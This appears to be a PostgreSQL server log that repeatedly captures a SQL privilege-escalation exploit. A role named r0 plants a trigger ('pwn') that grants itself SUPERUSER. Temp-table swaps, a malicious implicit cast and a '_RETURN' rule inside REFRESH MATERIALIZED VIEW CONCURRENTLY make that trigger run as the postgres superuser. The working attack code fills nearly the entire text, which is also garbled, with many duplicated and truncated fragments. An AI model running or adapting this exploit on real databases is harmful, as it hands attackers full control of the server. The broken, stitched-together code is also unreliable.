                ALTER USER r0 SUPERUSER;
            END IF;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED

              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE TYPE etyp AS ENUM ( 'e' );
        CREATE FUNCTION wrap_insert(INTEGER) RETURNS INTEGER LANGUAGE sql AS 
            $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
        CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
            $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
        CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;

        CREATE FUNCTION swap() RETURNS INTEGER AS $$
        DECLARE
            target TEXT := get_target();
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

            RETURN 1; 
        END

        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

2026-04-13 23:24:16.846 UTC [1591] STATEMENT:  CREATE ROLE r0 LOGIN ;
        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE TYPE etyp AS ENUM ( 'e' );
        CREATE FUNCTION wrap_insert(INTEGER) RETURNS INTEGER LANGUAGE sql AS 
            $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
        CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
            $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
        CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;

        CREATE FUNCTION swap() RETURNS INTEGER AS $$
        DECLARE
            target TEXT := get_target();
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE TYPE etyp AS ENUM ( 'e' );
        CREATE FUNCTION wrap_insert(INTEGER) RETURNS INTEGER LANGUAGE sql AS 
            $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
        CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
            $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
        CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;

        CREATE FUNCTION swap() RETURNS INTEGER AS $$
        DECLARE
            target TEXT := get_target();
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

2026-04-14 02:29:12.692 UTC [1610] STATEMENT:  CREATE ROLE r0 LOGIN ;
        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            DROP VIEW IF EXISTS remove_later;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE TYPE etyp AS ENUM ( 'e' );
        CREATE FUNCTION wrap_insert(INTEGER) RETURNS INTEGER LANGUAGE sql AS 
            $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
        CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
            $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
        CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;

        CREATE FUNCTION swap() RETURNS INTEGER AS $$
        DECLARE
            target TEXT := get_target();
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;
2026-04-14 05:14:21.346 UTC [6143] ERROR:  syntax error at or near "CONNECT" at character 54
2026-04-14 05:14:21.346 UTC [6143] STATEMENT:  CREATE ROLE r0 LOGIN ;
        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            DROP VIEW IF EXISTS remove_later;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;

            target TEXT := get_target();

          target TEXT := get_target();

            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);

            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

            $$ SELECT wrap_insert(1); $$ IMMUTABLE ;

        DECLARE
            target TEXT := get_target();
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);

            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;

        CREATE TABLE t1(i INTEGER);

            AFTER INSERT ON t1
            INITIALLY DEFERRED

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN

            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE TYPE etyp AS ENUM ( 'e' );
        CREATE FUNCTION wrap_insert(INTEGER) RETURNS INTEGER LANGUAGE sql AS 
            $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
        CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
            $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
        CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;

        CREATE FUNCTION swap() RETURNS INTEGER AS $$
        DECLARE
            target TEXT := get_target();
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

2026-04-14 09:53:22.011 UTC [6063] STATEMENT:  CREATE ROLE r0 LOGIN ;
        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            DROP VIEW IF EXISTS remove_later;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

        CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
            $$ SELECT wrap_insert(1); $$ IMMUTABLE ;

        DECLARE
            target TEXT := get_target();
        BEGIN

              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);

            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

                RAISE WARNING '-- user % --', current_user;

            INITIALLY DEFERRED

            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

        CREATE FUNCTION swap() RETURNS INTEGER AS $$
        DECLARE
            target TEXT := get_target();
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;
2026-04-14 11:49:58.889 UTC [1679] ERROR:  syntax error at or near "CONNECT" at character 54
2026-04-14 11:49:58.889 UTC [1679] STATEMENT:  CREATE ROLE r0 LOGIN ;
        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            DROP VIEW IF EXISTS remove_later;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;
        REFRESH MATERIALIZED VIEW CONCURRENTLY mv;

            target TEXT := get_target();

          target TEXT := get_target();

            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE TYPE etyp AS ENUM ( 'e' );
        CREATE FUNCTION wrap_insert(INTEGER) RETURNS INTEGER LANGUAGE sql AS 
            $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
        CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
            $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
        CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;

        CREATE FUNCTION swap() RETURNS INTEGER AS $$
        DECLARE
            target TEXT := get_target();
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
              EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
              EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
            END IF;
            RETURN 1; 
        END
        $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
        CREATE UNIQUE INDEX ix_mv_i ON mv (i);

        CONNECT rdb postgres;

2026-04-14 14:04:59.850 UTC [3600] STATEMENT:  CREATE ROLE r0 LOGIN ;
        CREATE DATABASE rdb OWNER r0;
        CONNECT rdb r0;

        CREATE FUNCTION pwn() RETURNS trigger AS $$
        BEGIN
            IF current_setting('is_superuser') THEN
                RAISE WARNING '-- user % --', current_user;
                ALTER USER r0 SUPERUSER;
            END IF;
            DROP VIEW IF EXISTS remove_later;
            RETURN NEW;
        END $$ LANGUAGE plpgsql;

        CREATE TABLE t1(i INTEGER);
        CREATE CONSTRAINT TRIGGER trig 
            AFTER INSERT ON t1
            INITIALLY DEFERRED
            FOR EACH ROW EXECUTE PROCEDURE pwn();

        CREATE FUNCTION get_target() RETURNS TEXT AS $$
            SELECT format('%I.%I',
              pg_my_temp_schema()::regnamespace,
              'pg_temp_' || 'mv'::text::regclass::oid
            );
        $$ LANGUAGE SQL STABLE ;

        CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
        DECLARE
            target TEXT := get_target(); 
        BEGIN
            IF to_regclass(target) IS NOT NULL THEN
                EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
                EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
            END IF;
            RETURN; 
        END $$ LANGUAGE plpgsql;

        CREATE FUNCTION attack() RETURNS INTEGER AS $$
        DECLARE
          target TEXT := get_target();
        BEGIN
            BEGIN 
                INSERT INTO t1 VALUES (1);
                EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
                EXECUTE format('CREATE TEMP TABLE %s()', target);
            EXCEPTION WHEN OTHERS THEN -- do nothing
            END;
            RETURN 2;
        END $$ LANGUAGE plpgsql;

        CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
